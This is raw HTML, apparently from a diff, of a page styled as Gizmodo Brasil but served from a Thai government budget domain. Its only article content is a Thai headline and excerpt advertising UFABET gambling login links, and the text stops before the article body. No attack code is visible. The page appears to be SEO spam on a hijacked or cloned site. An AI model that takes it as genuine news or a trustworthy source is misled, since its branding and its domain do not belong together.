fieldset,#ajaxsearchprosettings6_2.searchsettings fieldset,div.asp_s.asp_s_6.searchsettings fieldset{width:200px;min-width:200px;max-width:10000px}#ajaxsearchprobsettings6_1.searchsettings fieldset,#ajaxsearchprobsettings6_2.searchsettings fieldset,div.asp_sb.asp_sb_6.searchsettings fieldset{width:200px;min-width:200px;max-width:10000px}#ajaxsearchprosettings6_1.searchsettings fieldset legend,#ajaxsearchprosettings6_2.searchsettings fieldset legend,div.asp_s.asp_s_6.searchsettings fieldset legend{padding:0 0 0 10px;margin:0;background:transparent;font-weight:normal;font-family:"Open Sans";color:rgb(71,71,71);font-size:13px;line-height:15px;text-shadow:none}#ajaxsearchprores6_1.vertical,#ajaxsearchprores6_2.vertical,div.asp_r.asp_r_6.vertical{padding:4px;background:rgb(255,255,255);border-radius:3px;border:1px none rgb(0,0,0);border-radius:3px 3px 3px 3px;box-shadow:0 4px 28px -13px #000;visibility:hidden;display:none}#ajaxsearchprores6_1.vertical .results,#ajaxsearchprores6_2.vertical .results,div.asp_r.asp_r_6.vertical .results{max-height:none;overflow-x:hidden;overflow-y:auto}#ajaxsearchprores6_1.vertical .item,#ajaxsearchprores6_2.vertical .item,div.asp_r.asp_r_6.vertical .item{position:relative;box-sizing:border-box}#ajaxsearchprores6_1.vertical .item .asp_content h3,#ajaxsearchprores6_2.vertical .item .asp_content h3,div.asp_r.asp_r_6.vertical .item .asp_content h3{display:inline}#ajaxsearchprores6_1.vertical .results .item .asp_content,#ajaxsearchprores6_2.vertical .results .item .asp_content,div.asp_r.asp_r_6.vertical .results .item .asp_content{overflow:hidden;width:auto;height:auto;background:transparent;margin:0;padding:8px}#ajaxsearchprores6_1.vertical .results .item .asp_image,#ajaxsearchprores6_2.vertical .results .item .asp_image,div.asp_r.asp_r_6.vertical .results .item .asp_image{width:70px;height:70px;margin:2px 8px 0 0}#ajaxsearchprores6_1.vertical .asp_simplebar-scrollbar::before,#ajaxsearchprores6_2.vertical .asp_simplebar-scrollbar::before,div.asp_r.asp_r_6.vertical .asp_simplebar-scrollbar::before{background:transparent;background-image:-moz-radial-gradient(center,ellipse cover,rgba(0,0,0,0.5),rgba(0,0,0,0.5));background-image:-webkit-gradient(radial,center center,0px,center center,100%,rgba(0,0,0,0.5),rgba(0,0,0,0.5));background-image:-webkit-radial-gradient(center,ellipse cover,rgba(0,0,0,0.5),rgba(0,0,0,0.5));background-image:-o-radial-gradient(center,ellipse cover,rgba(0,0,0,0.5),rgba(0,0,0,0.5));background-image:-ms-radial-gradient(center,ellipse cover,rgba(0,0,0,0.5),rgba(0,0,0,0.5));background-image:radial-gradient(ellipse at center,rgba(0,0,0,0.5),rgba(0,0,0,0.5))}#ajaxsearchprores6_1.vertical .results .item::after,#ajaxsearchprores6_2.vertical .results .item::after,div.asp_r.asp_r_6.vertical .results .item::after{display:block;position:absolute;bottom:0;content:"";height:1px;width:100%;background:rgba(218,218,218,1)}#ajaxsearchprores6_1.vertical .results .item.asp_last_item::after,#ajaxsearchprores6_2.vertical .results .item.asp_last_item::after,div.asp_r.asp_r_6.vertical .results .item.asp_last_item::after{display:none}.asp_spacer{display:none !important;}.asp_v_spacer{width:100%;height:0}#ajaxsearchprores6_1 .asp_group_header,#ajaxsearchprores6_2 .asp_group_header,div.asp_r.asp_r_6 .asp_group_header{background:#DDD;background:rgb(246,246,246);border-radius:3px 3px 0 0;border-top:1px solid rgb(248,248,248);border-left:1px solid rgb(248,248,248);border-right:1px solid rgb(248,248,248);margin:0 0 -3px;padding:7px 0 7px 10px;position:relative;z-index:1000;min-width:90%;flex-grow:1;font-weight:bold;font-family:"Open Sans";color:rgb(0,0,0);font-size:11px;line-height:13px;text-shadow:none}#ajaxsearchprores6_1.vertical .results,#ajaxsearchprores6_2.vertical .results,div.asp_r.asp_r_6.vertical .results{scrollbar-width:thin;scrollbar-color:rgba(0,0,0,0.5) rgb(255,255,255)}#ajaxsearchprores6_1.vertical .results::-webkit-scrollbar,#ajaxsearchprores6_2.vertical .results::-webkit-scrollbar,div.asp_r.asp_r_6.vertical .results::-webkit-scrollbar{width:10px}#ajaxsearchprores6_1.vertical .results::-webkit-scrollbar-track,#ajaxsearchprores6_2.vertical .results::-webkit-scrollbar-track,div.asp_r.asp_r_6.vertical .results::-webkit-scrollbar-track{background:rgb(255,255,255);box-shadow:inset 0 0 12px 12px transparent;border:none}#ajaxsearchprores6_1.vertical .results::-webkit-scrollbar-thumb,#ajaxsearchprores6_2.vertical .results::-webkit-scrollbar-thumb,div.asp_r.asp_r_6.vertical .results::-webkit-scrollbar-thumb{background:transparent;box-shadow:inset 0 0 12px 12px rgba(0,0,0,0);border:solid 2px transparent;border-radius:12px}#ajaxsearchprores6_1.vertical:hover .results::-webkit-scrollbar-thumb,#ajaxsearchprores6_2.vertical:hover .results::-webkit-scrollbar-thumb,div.asp_r.asp_r_6.vertical:hover .results::-webkit-scrollbar-thumb{box-shadow:inset 0 0 12px 12px rgba(0,0,0,0.5)}@media(hover:none),(max-width:500px){#ajaxsearchprores6_1.vertical .results::-webkit-scrollbar-thumb,#ajaxsearchprores6_2.vertical .results::-webkit-scrollbar-thumb,div.asp_r.asp_r_6.vertical .results::-webkit-scrollbar-thumb{box-shadow:inset 0 0 12px 12px rgba(0,0,0,0.5)}}.asp_m_6 .probox .promagnifier,.asp_m_6 .probox .prosettings{padding:0 8px !important}.asp_m_6[asp-compact=closed] .probox .promagnifier,.asp_m_6[asp-compact=closed] .probox .prosettings{padding:0 !important}</style>
+				<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+				<style>
+					@font-face {
+  font-family: 'Lato';
+  font-style: normal;
+  font-weight: 300;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/lato/v24/S6u9w4BMUTPHh7USSwiPHA.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Lato';
+  font-style: normal;
+  font-weight: 400;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/lato/v24/S6uyw4BMUTPHjx4wWw.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Lato';
+  font-style: normal;
+  font-weight: 700;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/lato/v24/S6u9w4BMUTPHh6UVSwiPHA.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 300;
+  font-stretch: normal;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/opensans/v35/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsiH0B4gaVc.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 400;
+  font-stretch: normal;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/opensans/v35/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsjZ0B4gaVc.ttf) format('truetype');
+}
+@font-face {
+  font-family: 'Open Sans';
+  font-style: normal;
+  font-weight: 700;
+  font-stretch: normal;
+  font-display: swap;
+  src: url(https://fonts.gstatic.com/s/opensans/v35/memSYaGs126MiZpBA-UvWbX2vVnXBbObj2OVZyOOSr4dVJWUgsg-1x4gaVc.ttf) format('truetype');
+}
+
+				</style></head>
+<style>
+	:root {
+		--enableDarkmode: dark;
+	}
+</style>
+
+<body class="post-template-default single single-post postid-634646 single-format-standard is-mobile">
+
+
+		<div class="sup-mobile-menu">
+    <div class="sup-mobile-menu__wrap">
+        <div class="alignment">
+
+            <div class="logo">
+                                    <p class="site-title"><a href="https://opsmoacbudget.moac.go.th/" rel="home"><img src="https://opsmoacbudget.moac.go.th/wp-content/themes/gizbr_bda8bc8c/offline-uploads/logo-header.svg" alt="logo" width="219" height="56"></a></p>
+                
+            </div>
+
+
+            <ul class="sup-nav sup-nav--mobile"><li class="sup-nav__item  sup-nav__item--45725"><a href="https://opsmoacbudget.moac.go.th/tecnologia/" class="sup-nav__link">Tecnologia</a></li>
+<li class="sup-nav__item  sup-nav__item--1103"><a href="https://opsmoacbudget.moac.go.th/ciencia/" class="sup-nav__link">Ciência</a></li>
+<li class="sup-nav__item  sup-nav__item--47705"><a href="https://opsmoacbudget.moac.go.th/curiosidades/cultura/" class="sup-nav__link">Cultura</a></li>
+<li class="sup-nav__item  sup-nav__item--66013"><a href="https://opsmoacbudget.moac.go.th/curiosidades/cultura/onde-assistir/" class="sup-nav__link">Onde Assistir</a></li>
+<li class="sup-nav__item  sup-nav__item--47755"><a href="https://opsmoacbudget.moac.go.th/ofertas/" class="sup-nav__link">💲 Ofertas</a></li>
+<li class="sup-nav__item  sup-nav__item--542041"><a href="https://opsmoacbudget.moac.go.th/ultimas-materias/" class="sup-nav__link">Últimas Matérias</a></li>
+<li class="sup-nav__item  sup-nav__item--57383"><a href="https://opsmoacbudget.moac.go.th/parcerias-giz/" class="sup-nav__link">Parcerias Giz</a></li>
+<li class="sup-nav__item  sup-nav__item--54479"><a href="https://opsmoacbudget.moac.go.th/colunistas/" class="sup-nav__link">Colunistas</a></li>
+<li class="sup-nav__item  sup-nav__item--120738"><a href="https://opsmoacbudget.moac.go.th/expediente/" class="sup-nav__link">Expediente</a></li>
+</ul>
+            <div class="sup-social">
+                
+						<ul>
+							<li><a target="_blank" href="https://twitter.com/giz_brasil"><span class="fab fa-twitter"></span></a></li>							<li><a target="_blank" href="https://www.linkedin.com/company/gizmodo-brasil/"><span class="fab fa-linkedin"></span></a></li>							<li><a target="_blank" href="https://www.facebook.com/gizmodobrasil/?locale=pt_BR"><span class="fab fa-facebook-f"></span></a></li>
+						</ul>
+
+
+				
+
+
+
+            </div>
+
+            <div class="sup-copy">
+                2023 © Copyright 404 - Todos os direitos reservados
+            </div>
+
+        </div>
+    </div>
+</div>
+	<header id="masthead" class="sup-header mobile" data-url="https://opsmoacbudget.moac.go.th">
+		<div class="sup-header__row sup-container">
+
+			<div class="c-1">
+									<div class="sup-social">
+						<ul>
+							<li><a target="_blank" href="https://twitter.com/giz_brasil"><span class="fab fa-twitter"></span></a></li>							<li><a target="_blank" href="https://www.linkedin.com/company/gizmodo-brasil/"><span class="fab fa-linkedin"></span></a></li>							<li><a target="_blank" href="https://www.facebook.com/gizmodobrasil/?locale=pt_BR"><span class="fab fa-facebook-f"></span></a></li>
+						</ul>
+					</div>
+
+								<div class="social-block-search search-bar toggle">
+					
+						<svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
+							<path d="M1.94167 20.25L9.06458 13.1271C9.60625 13.5965 10.2382 13.9622 10.9604 14.224C11.6826 14.4858 12.45 14.6167 13.2625 14.6167C15.2125 14.6167 16.8646 13.9396 18.2188 12.5854C19.5729 11.2312 20.25 9.59722 20.25 7.68333C20.25 5.76944 19.5729 4.13542 18.2188 2.78125C16.8646 1.42708 15.2215 0.75 13.2896 0.75C11.3757 0.75 9.74618 1.42708 8.40104 2.78125C7.0559 4.13542 6.38333 5.76944 6.38333 7.68333C6.38333 8.45972 6.50972 9.20903 6.7625 9.93125C7.01528 10.6535 7.39444 11.3306 7.9 11.9625L0.75 19.0583L1.94167 20.25ZM13.2896 12.9917C11.8271 12.9917 10.5812 12.4726 9.55208 11.4344C8.52292 10.3962 8.00833 9.14583 8.00833 7.68333C8.00833 6.22083 8.52292 4.97049 9.55208 3.93229C10.5812 2.8941 11.8271 2.375 13.2896 2.375C14.7701 2.375 16.0295 2.8941 17.0677 3.93229C18.1059 4.97049 18.625 6.22083 18.625 7.68333C18.625 9.14583 18.1059 10.3962 17.0677 11.4344C16.0295 12.4726 14.7701 12.9917 13.2896 12.9917Z" fill="#4D4D4D" />
+						</svg>
+									</div>
+			</div>
+
+
+			<div class="c-2">
+				
+				<div class="logo">
+											<p class=" site-title"><a href="https://opsmoacbudget.moac.go.th/" rel="home"><img src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2023/10/logo_giz.svg" alt="logo" width="219" height="56"></a></p>
+									</div>
+			</div>
+
+			<div class=" c-3">
+
+									<a href="https://gizbrasil.substack.com/subscribe" target="_blank" class="btn-newsletter">
+						<svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+							<path d="M4.33317 3.33325H17.6665C18.5832 3.33325 19.3332 4.08325 19.3332 4.99992V14.9999C19.3332 15.9166 18.5832 16.6666 17.6665 16.6666H4.33317C3.4165 16.6666 2.6665 15.9166 2.6665 14.9999V4.99992C2.6665 4.08325 3.4165 3.33325 4.33317 3.33325Z" stroke="black" stroke-linecap="round" stroke-linejoin="round" />
+							<path d="M19.3332 5L10.9998 10.8333L2.6665 5" stroke="black" stroke-linecap="round" stroke-linejoin="round" />
+						</svg>
+						Assine nossa newsletter
+					</a>
+							</div>
+
+
+			<div class="c-4">
+				<ul class="sup-nav sup-nav--main"><li class="sup-nav__item  sup-nav__item--45725"><a href="https://opsmoacbudget.moac.go.th/tecnologia/" class="sup-nav__link">Tecnologia</a></li>
+<li class="sup-nav__item  sup-nav__item--1103"><a href="https://opsmoacbudget.moac.go.th/ciencia/" class="sup-nav__link">Ciência</a></li>
+<li class="sup-nav__item  sup-nav__item--47705"><a href="https://opsmoacbudget.moac.go.th/curiosidades/cultura/" class="sup-nav__link">Cultura</a></li>
+<li class="sup-nav__item  sup-nav__item--66013"><a href="https://opsmoacbudget.moac.go.th/curiosidades/cultura/onde-assistir/" class="sup-nav__link">Onde Assistir</a></li>
+<li class="sup-nav__item  sup-nav__item--47755"><a href="https://opsmoacbudget.moac.go.th/ofertas/" class="sup-nav__link">💲 Ofertas</a></li>
+<li class="sup-nav__item  sup-nav__item--542041"><a href="https://opsmoacbudget.moac.go.th/ultimas-materias/" class="sup-nav__link">Últimas Matérias</a></li>
+<li class="sup-nav__item  sup-nav__item--57383"><a href="https://opsmoacbudget.moac.go.th/parcerias-giz/" class="sup-nav__link">Parcerias Giz</a></li>
+<li class="sup-nav__item  sup-nav__item--54479"><a href="https://opsmoacbudget.moac.go.th/colunistas/" class="sup-nav__link">Colunistas</a></li>
+<li class="sup-nav__item  sup-nav__item--120738"><a href="https://opsmoacbudget.moac.go.th/expediente/" class="sup-nav__link">Expediente</a></li>
+</ul>				<div class="search-bar toggle">
+
+											<svg width="21" height="21" viewBox="0 0 21 21" fill="none" xmlns="http://www.w3.org/2000/svg">
+							<path d="M1.94167 20.25L9.06458 13.1271C9.60625 13.5965 10.2382 13.9622 10.9604 14.224C11.6826 14.4858 12.45 14.6167 13.2625 14.6167C15.2125 14.6167 16.8646 13.9396 18.2188 12.5854C19.5729 11.2312 20.25 9.59722 20.25 7.68333C20.25 5.76944 19.5729 4.13542 18.2188 2.78125C16.8646 1.42708 15.2215 0.75 13.2896 0.75C11.3757 0.75 9.74618 1.42708 8.40104 2.78125C7.0559 4.13542 6.38333 5.76944 6.38333 7.68333C6.38333 8.45972 6.50972 9.20903 6.7625 9.93125C7.01528 10.6535 7.39444 11.3306 7.9 11.9625L0.75 19.0583L1.94167 20.25ZM13.2896 12.9917C11.8271 12.9917 10.5812 12.4726 9.55208 11.4344C8.52292 10.3962 8.00833 9.14583 8.00833 7.68333C8.00833 6.22083 8.52292 4.97049 9.55208 3.93229C10.5812 2.8941 11.8271 2.375 13.2896 2.375C14.7701 2.375 16.0295 2.8941 17.0677 3.93229C18.1059 4.97049 18.625 6.22083 18.625 7.68333C18.625 9.14583 18.1059 10.3962 17.0677 11.4344C16.0295 12.4726 14.7701 12.9917 13.2896 12.9917Z" fill="#4D4D4D" />
+						</svg>
+									</div>
+			</div>
+			<div class="c-5">
+				<div class="sup-hamburger">
+					<span></span>
+					<span></span>
+					<span></span>
+				</div>
+			</div>
+
+		</div>
+
+
+
+
+	</header><!-- #masthead -->
+
+	
+<div class="sup-search-box" style="opacity:0">
+    <div class="sup-search-box__container">
+
+        <div class="asp_w_container asp_w_container_6 asp_w_container_6_1" data-id="6"><div class='asp_w asp_m asp_m_6 asp_m_6_1 wpdreams_asp_sc wpdreams_asp_sc-6 ajaxsearchpro asp_main_container asp_non_compact' data-id="6" data-name="Global Search imported" data-instance="1" id='ajaxsearchpro6_1'><div class="probox"><div class='prosettings' style='display:none;' data-opened=0><div class='innericon'><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 512 512"><path d="M153.415 256c0 28.558-23.15 51.708-51.707 51.708C73.15 307.708 50 284.558 50 256s23.15-51.708 51.708-51.708c28.557 0 51.707 23.15 51.707 51.708zM256 204.292c-28.558 0-51.708 23.15-51.708 51.708s23.15 51.708 51.708 51.708 51.708-23.15 51.708-51.708-23.15-51.708-51.708-51.708zm154.292 0c-28.557 0-51.707 23.15-51.707 51.708s23.15 51.708 51.707 51.708C438.85 307.708 462 284.558 462 256s-23.15-51.708-51.708-51.708z"/></svg></div></div><div class='proinput'><form role="search" action='#' autocomplete="off" aria-label="Search form"><input type='search' class='orig' placeholder='Busque aqui ...' name='phrase' value='' aria-label="Search input" autocomplete="off"/><input type='text' class='autocomplete' name='phrase' value='' aria-label="Search autocomplete input" aria-hidden="true" tabindex="-1" autocomplete="off" disabled/></form></div><button class='promagnifier' aria-label="Search magnifier button"><span class='asp_text_button'> Buscar </span><span class='innericon hiddend'><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 512 512"><path d="M460.355 421.59l-106.51-106.512c20.04-27.553 31.884-61.437 31.884-98.037C385.73 124.935 310.792 50 218.685 50c-92.106 0-167.04 74.934-167.04 167.04 0 92.107 74.935 167.042 167.04 167.042 34.912 0 67.352-10.773 94.184-29.158L419.945 462l40.41-40.41zM100.63 217.04c0-65.095 52.96-118.055 118.056-118.055 65.098 0 118.057 52.96 118.057 118.056 0 65.097-52.96 118.057-118.057 118.057-65.096 0-118.055-52.96-118.055-118.056z"/></svg></span><span class="asp_clear"></span></button><div class='proloading'><div class="asp_loader"><div class="asp_loader-inner asp_ball-pulse"><div></div><div></div><div></div></div></div></div><div class='proclose'><svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="512px" height="512px" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><polygon points="438.393,374.595 319.757,255.977 438.378,137.348 374.595,73.607 255.995,192.225 137.375,73.622 73.607,137.352 192.246,255.983 73.622,374.625 137.352,438.393 256.002,319.734 374.652,438.378 "/></svg></div></div></div><div class='asp_data_container' style="display:none !important;"><div class="asp_init_data" style="display:none !important;" id="asp_init_id_6_1" data-asp-id="6" data-asp-instance="1" data-aspdata="eyJob21ldXJsIjoiaHR0cHM6XC9cL2dpem1vZG8udW9sLmNvbS5iclwvIiwiaXNfcmVzdWx0c19wYWdlIjowLCJyZXN1bHRzdHlwZSI6InZlcnRpY2FsIiwicmVzdWx0c3Bvc2l0aW9uIjoiaG92ZXIiLCJyZXN1bHRzU25hcFRvIjoibGVmdCIsInJlc3VsdHMiOnsid2lkdGgiOiJhdXRvIiwid2lkdGhfdGFibGV0IjoiYXV0byIsIndpZHRoX3Bob25lIjoiYXV0byJ9LCJpdGVtc2NvdW50Ijo0LCJjaGFyY291bnQiOjAsImhpZ2hsaWdodCI6MCwiaGlnaGxpZ2h0V2hvbGV3b3JkcyI6MSwic2luZ2xlSGlnaGxpZ2h0IjowLCJzY3JvbGxUb1Jlc3VsdHMiOnsiZW5hYmxlZCI6MCwib2Zmc2V0IjowfSwiYXV0b2NvbXBsZXRlIjp7ImVuYWJsZWQiOjEsInRyaWdnZXJfY2hhcmNvdW50IjowLCJnb29nbGVPbmx5IjoxLCJsYW5nIjoiZW4iLCJtb2JpbGUiOjF9LCJ0cmlnZ2VyIjp7ImRlbGF5IjozMDAsImF1dG9jb21wbGV0ZV9kZWxheSI6MzEwLCJ1cGRhdGVfaHJlZiI6MCwiZmFjZXQiOjEsInR5cGUiOjEsImNsaWNrIjoiYWpheF9zZWFyY2giLCJjbGlja19sb2NhdGlvbiI6InNhbWUiLCJyZXR1cm4iOiJhamF4X3NlYXJjaCIsInJldHVybl9sb2NhdGlvbiI6InNhbWUiLCJyZWRpcmVjdF91cmwiOiI/cz17cGhyYXNlfSIsImVsZW1lbnRvcl91cmwiOiJodHRwczpcL1wvZ2l6bW9kby51b2wuY29tLmJyXC8/YXNwX2xzPXtwaHJhc2V9In0sIm92ZXJyaWRld3BkZWZhdWx0IjoxLCJvdmVycmlkZV9tZXRob2QiOiJnZXQiLCJzZXR0aW5ncyI6eyJ1bnNlbGVjdENoaWxkcmVuIjoxLCJoaWRlQ2hpbGRyZW4iOjB9LCJzZXR0aW5nc2ltYWdlcG9zIjoibGVmdCIsInNldHRpbmdzVmlzaWJsZSI6MCwic2V0dGluZ3NIaWRlT25SZXMiOjAsInByZXNjb250YWluZXJoZWlnaHQiOiI0MDBweCIsImNsb3NlT25Eb2NDbGljayI6MSwiZm9jdXNPblBhZ2Vsb2FkIjowLCJpc290b3BpYyI6eyJpdGVtV2lkdGgiOiIyMDBweCIsIml0ZW1XaWR0aFRhYmxldCI6IjIwMHB4IiwiaXRlbVdpZHRoUGhvbmUiOiIyMDBweCIsIml0ZW1IZWlnaHQiOiIyMDBweCIsIml0ZW1IZWlnaHRUYWJsZXQiOiIyMDBweCIsIml0ZW1IZWlnaHRQaG9uZSI6IjIwMHB4IiwicGFnaW5hdGlvbiI6MSwicm93cyI6MiwiZ3V0dGVyIjo1LCJzaG93T3ZlcmxheSI6MSwiYmx1ck92ZXJsYXkiOjEsImhpZGVDb250ZW50IjoxfSwibG9hZGVyTG9jYXRpb24iOiJhdXRvIiwic2hvd19tb3JlIjp7ImVuYWJsZWQiOjAsInVybCI6Ij9zPXtwaHJhc2V9IiwiZWxlbWVudG9yX3VybCI6Imh0dHBzOlwvXC9naXptb2RvLnVvbC5jb20uYnJcLz9hc3BfbHM9e3BocmFzZX0iLCJhY3Rpb24iOiJhamF4IiwibG9jYXRpb24iOiJzYW1lIiwiaW5maW5pdGUiOjF9LCJtb2JpbGUiOnsidHJpZ2dlcl9vbl90eXBlIjoxLCJjbGlja19hY3Rpb24iOiJhamF4X3NlYXJjaCIsInJldHVybl9hY3Rpb24iOiJhamF4X3NlYXJjaCIsImNsaWNrX2FjdGlvbl9sb2NhdGlvbiI6InNhbWUiLCJyZXR1cm5fYWN0aW9uX2xvY2F0aW9uIjoic2FtZSIsInJlZGlyZWN0X3VybCI6Ij9zPXtwaHJhc2V9IiwiZWxlbWVudG9yX3VybCI6Imh0dHBzOlwvXC9naXptb2RvLnVvbC5jb20uYnJcLz9hc3BfbHM9e3BocmFzZX0iLCJtZW51X3NlbGVjdG9yIjoiI21lbnUtdG9nZ2xlIiwiaGlkZV9rZXlib2FyZCI6MCwiZm9yY2VfcmVzX2hvdmVyIjowLCJmb3JjZV9zZXR0X2hvdmVyIjowLCJmb3JjZV9zZXR0X3N0YXRlIjoibm9uZSJ9LCJjb21wYWN0Ijp7ImVuYWJsZWQiOjAsImZvY3VzIjoxLCJ3aWR0aCI6IjEwMCUiLCJ3aWR0aF90YWJsZXQiOiI0ODBweCIsIndpZHRoX3Bob25lIjoiMzIwcHgiLCJjbG9zZU9uTWFnbmlmaWVyIjoxLCJjbG9zZU9uRG9jdW1lbnQiOjAsInBvc2l0aW9uIjoic3RhdGljIiwib3ZlcmxheSI6MH0sInNiIjp7InJlZGlyZWN0X2FjdGlvbiI6ImFqYXhfc2VhcmNoIiwicmVkaXJlY3RfbG9jYXRpb24iOiJzYW1lIiwicmVkaXJlY3RfdXJsIjoiP3M9e3BocmFzZX0iLCJlbGVtZW50b3JfdXJsIjoiaHR0cHM6XC9cL2dpem1vZG8udW9sLmNvbS5iclwvP2FzcF9scz17cGhyYXNlfSJ9LCJyYiI6eyJhY3Rpb24iOiJub3RoaW5nIn0sImFuaW1hdGlvbnMiOnsicGMiOnsic2V0dGluZ3MiOnsiYW5pbSI6ImZhZGVkcm9wIiwiZHVyIjozMDB9LCJyZXN1bHRzIjp7ImFuaW0iOiJmYWRlZHJvcCIsImR1ciI6MzAwfSwiaXRlbXMiOiJmYWRlSW5Eb3duIn0sIm1vYiI6eyJzZXR0aW5ncyI6eyJhbmltIjoiZmFkZWRyb3AiLCJkdXIiOjMwMH0sInJlc3VsdHMiOnsiYW5pbSI6ImZhZGVkcm9wIiwiZHVyIjozMDB9LCJpdGVtcyI6InZvaWRhbmltIn19LCJzZWxlY3QyIjp7Im5vcmVzIjoiTm8gcmVzdWx0cyBtYXRjaCJ9LCJkZXRlY3RWaXNpYmlsaXR5IjowLCJhdXRvcCI6eyJzdGF0ZSI6ImRpc2FibGVkIiwicGhyYXNlIjoiIiwiY291bnQiOjEwfSwid29vU2hvcCI6eyJ1c2VBamF4IjowLCJzZWxlY3RvciI6IiNtYWluIiwidXJsIjoiIn0sInRheEFyY2hpdmUiOnsidXNlQWpheCI6MCwic2VsZWN0b3IiOiIjbWFpbiIsInVybCI6IiJ9LCJjcHRBcmNoaXZlIjp7InVzZUFqYXgiOjAsInNlbGVjdG9yIjoiI21haW4iLCJ1cmwiOiIifSwicmVzUGFnZSI6eyJ1c2VBamF4IjowLCJzZWxlY3RvciI6IiNtYWluIiwidHJpZ2dlcl90eXBlIjoxLCJ0cmlnZ2VyX2ZhY2V0IjoxLCJ0cmlnZ2VyX21hZ25pZmllciI6MCwidHJpZ2dlcl9yZXR1cm4iOjB9LCJmc3NfbGF5b3V0IjoiZmxleCIsInNjcm9sbEJhciI6eyJob3Jpem9udGFsIjp7ImVuYWJsZWQiOjF9fSwiZGl2aSI6eyJib2R5Y29tbWVyY2UiOjB9LCJwcmV2ZW50Qm9keVNjcm9sbCI6MCwic3RhdGlzdGljcyI6MCwicHJldmVudEV2ZW50cyI6MH0="></div><div class='asp_hidden_data' style="display:none !important;"><div class='asp_item_overlay'><div class='asp_item_inner'><svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 512 512"><path d="M460.355 421.59l-106.51-106.512c20.04-27.553 31.884-61.437 31.884-98.037C385.73 124.935 310.792 50 218.685 50c-92.106 0-167.04 74.934-167.04 167.04 0 92.107 74.935 167.042 167.04 167.042 34.912 0 67.352-10.773 94.184-29.158L419.945 462l40.41-40.41zM100.63 217.04c0-65.095 52.96-118.055 118.056-118.055 65.098 0 118.057 52.96 118.057 118.056 0 65.097-52.96 118.057-118.057 118.057-65.096 0-118.055-52.96-118.055-118.056z"/></svg></div></div></div></div><div id='__original__ajaxsearchprores6_1' class='asp_w asp_r asp_r_6 asp_r_6_1 vertical ajaxsearchpro wpdreams_asp_sc wpdreams_asp_sc-6' data-id="6" data-instance="1"><div class="results"><div class="resdrg"></div></div><div class="asp_res_loader hiddend"><div class="asp_loader"><div class="asp_loader-inner asp_ball-pulse"><div></div><div></div><div></div></div></div></div></div><div id='__original__ajaxsearchprosettings6_1' class="asp_w asp_ss asp_ss_6 asp_s asp_s_6 asp_s_6_1 wpdreams_asp_sc wpdreams_asp_sc-6 ajaxsearchpro searchsettings" data-id="6" data-instance="1"><form name='options' class="asp-fss-flex" aria-label="Search settings form" autocomplete = 'off'><input type="hidden" name="current_page_id" value="634646"><input type='hidden' name='qtranslate_lang' value='0'/><input type="hidden" name="filters_changed" value="0"><input type="hidden" name="filters_initial" value="1"><div style="clear:both;"></div></form></div></div>    </div>
+
+</div>
+
+<span class="sup-search-box__trigger" style="opacity:0"></span>
+
+	<div id="content" class="site-content"><div  class="sup-container sup-publicidade__center"><div class="my-30">    <div id="728x90-parcerias-outras-linguas-1" class="sup-publicidade__wrap">
+    
+            <script>
+                window.uolads.push({
+                    id: "728x90-parcerias-outras-linguas-1"
+                });
+            </script>
+      
+
+
+            <!-- <img src="" alt=""> -->
+
+ 
+    </div>
+
+</div></div><section class="sup-single__wrap  sup-single__wrap--"><section class="sup-single__post getHeight">
+    
+        <div class="sup-single__header">
+            <div class="refs">
+                <a href="https://opsmoacbudget.moac.go.th/parcerias_giz-outras-linguas/" class="cat " style=" ">
+                    Parcerias Giz (Outras Línguas)                </a>
+                            </div>
+            <div class="sup-single__title">
+                <h1>UFABET เข้าสู่ระบบ รีวิวลิงค์เข้าสู่ระบบล่าสุดเว็บ UFA มือถือ</h1>            </div>
+            <div class="sup-single__excerpt">
+                ลิงค์เข้าสู่ระบบ UFABET ล่าสุด รองรับทั้งมือถือและคอมพิวเตอร์ ปลอดภัย รวดเร็ว พร้อมลิงค์สำรองและการบริการตลอด 24 ชม.            </div>
+        </div>
+
+
+
+        <div class="sup-single__leftblock">
+            <div class="wrap">
+
+
+                                                            <figure class="thumbnail horizontal-thumbnail" style="">
+
+                            <img width="1300" height="740" src="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg" class="attachment-full size-full wp-post-image" alt="" decoding="async" fetchpriority="high" srcset="https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28.jpg 1300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28-300x171.jpg 300w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28-970x552.jpg 970w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28-316x180.jpg 316w, https://opsmoacbudget.moac.go.th/wp-content/blogs.dir/8/files/2025/03/image2-28-768x437.jpg 768w" sizes="(max-width: 1300px) 100vw, 1300px" />
+
+
+                        </figure>
+                                    
+            </div>
+
+        </div>
+        <div class="sup-sit">
+
+        
+
+        
+
+        <div class="sup-single__postinfo">
